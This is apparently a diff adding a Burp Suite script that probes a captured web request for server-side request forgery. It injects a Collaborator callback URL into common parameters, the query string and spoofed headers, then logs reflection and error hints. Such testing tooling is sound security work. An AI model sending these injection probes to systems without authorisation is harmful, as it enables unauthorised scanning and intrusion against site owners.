@@ -1,0 +1,89 @@
+// Generate a unique ID with timestamp for precise tracking
+String uniqueId = "ssrf-" + System.currentTimeMillis();
+
+// Replace with your actual Burp Collaborator domain
+String collaboratorDomain = uniqueId + ".burpcollaborator.net";
+String payloadUrl = "http://" + collaboratorDomain + "/";
+
+// Get original request and modify it
+HttpRequest originalRequest = requestResponse.request();
+String originalBody = originalRequest.bodyToString();
+String originalUrl = originalRequest.url();
+
+logging().logToOutput("[SSRF Detector] Starting SSRF test...");
+logging().logToOutput("[SSRF Detector] Original URL: " + originalUrl);
+logging().logToOutput("[SSRF Detector] Original body length: " + originalBody.length());
+
+// Test multiple injection points
+String[] paramNames = {"url", "redirect", "callback", "endpoint", "target", "link", "uri", "host", "domain"};
+String testBody = originalBody;
+
+// Add SSRF payloads to body for common parameter names
+for (String param : paramNames) {
+    if (testBody.length() > 0 && !testBody.endsWith("&")) {
+        testBody += "&";
+    }
+    testBody += param + "=" + payloadUrl;
+}
+
+logging().logToOutput("[SSRF Detector] Modified body: " + testBody);
+
+// Test URL parameter injection
+String testUrl = originalUrl;
+if (testUrl.contains("?")) {
+    testUrl += "&url=" + payloadUrl + "&redirect=" + payloadUrl;
+} else {
+    testUrl += "?url=" + payloadUrl + "&redirect=" + payloadUrl;
+}
+
+logging().logToOutput("[SSRF Detector] Modified URL: " + testUrl);
+
+// Create request with modified URL and headers
+HttpRequest ssrfRequest = HttpRequest.httpRequestFromUrl(testUrl)
+    .withMethod(originalRequest.method())
+    .withAddedHeader("X-Forwarded-For", payloadUrl)
+    .withAddedHeader("Referer", payloadUrl)
+    .withAddedHeader("X-Real-IP", payloadUrl)
+    .withAddedHeader("X-Originating-IP", payloadUrl)
+    .withAddedHeader("Host-Override", collaboratorDomain)
+    .withUpdatedHeader("User-Agent", "SSRF-Test-" + uniqueId)
+    .withBody(testBody);
+
+// Copy original headers to new request
+for (HttpHeader header : originalRequest.headers()) {
+    if (!header.name().equalsIgnoreCase("Host") && 
+        !header.name().equalsIgnoreCase("User-Agent") &&
+        !header.name().equalsIgnoreCase("Content-Length")) {
+        ssrfRequest = ssrfRequest.withAddedHeader(header.name(), header.value());
+    }
+}
+
+// Send the modified request
+var response = api().http().sendRequest(ssrfRequest);
+
+// Detailed logging for tracking
+logging().logToOutput("[SSRF Detector] ===== SSRF TEST RESULTS =====");
+logging().logToOutput("[SSRF Detector] Payload ID: " + uniqueId);
+logging().logToOutput("[SSRF Detector] Collaborator domain: " + collaboratorDomain);
+logging().logToOutput("[SSRF Detector] Response status: " + response.response().statusCode());
+logging().logToOutput("[SSRF Detector] Response length: " + response.response().body().length());
+
+// Check for immediate indicators in response
+String responseBody = response.response().bodyToString();
+if (responseBody.contains(collaboratorDomain) || responseBody.contains(uniqueId)) {
+    logging().logToOutput("[SSRF Detector] ⚠️  POTENTIAL SSRF - Domain reflected in response!");
+}
+
+// Check for error messages that might indicate SSRF attempts
+String[] errorIndicators = {"connection", "timeout", "refused", "unreachable", "dns", "resolve"};
+String responseLower = responseBody.toLowerCase();
+for (String indicator : errorIndicators) {
+    if (responseLower.contains(indicator)) {
+        logging().logToOutput("[SSRF Detector] ⚠️  Potential error indicator: " + indicator);
+        break;
+    }
+}
+
+logging().logToOutput("[SSRF Detector] ===== CHECK COLLABORATOR FOR DNS LOOKUPS =====");
+logging().logToOutput("[SSRF Detector] Search for: " + collaboratorDomain);
+logging().logToOutput("[SSRF Detector] Or search for: " + uniqueId);
